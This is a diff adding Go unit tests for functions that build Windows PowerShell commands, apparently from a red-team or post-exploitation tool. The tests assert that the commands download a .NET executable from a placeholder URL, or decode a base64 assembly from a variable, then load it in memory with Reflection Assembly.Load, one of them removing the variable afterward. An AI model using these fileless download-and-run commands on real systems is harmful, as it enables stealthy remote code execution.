@@ -33,3 +33,32 @@ func TestBuildWindowsPowerShellB64Command(t *testing.T) {
 		}
 	}
 }
+
+func TestBuildWindowsDotNetHTTPCommand(t *testing.T) {
+	cmd := buildWindowsDotNetHTTPCommand("https://example.test/tool.exe", []string{"audit", "bar baz"})
+	checks := []string{
+		"DownloadData('https://example.test/tool.exe')",
+		"[System.Reflection.Assembly]::Load($bytes)",
+		"@(,[string[]]@('audit', 'bar baz'))",
+	}
+	for _, check := range checks {
+		if !strings.Contains(cmd, check) {
+			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
+		}
+	}
+}
+
+func TestBuildWindowsDotNetB64Command(t *testing.T) {
+	cmd := buildWindowsDotNetB64Command("gummy_asm_var", []string{"audit", "bar baz"})
+	checks := []string{
+		"FromBase64String($gummy_asm_var)",
+		"[System.Reflection.Assembly]::Load($bytes)",
+		"@(,[string[]]@('audit', 'bar baz'))",
+		"Remove-Variable -Name gummy_asm_var",
+	}
+	for _, check := range checks {
+		if !strings.Contains(cmd, check) {
+			t.Fatalf("expected command to contain %q, got: %s", check, cmd)
+		}
+	}
+}
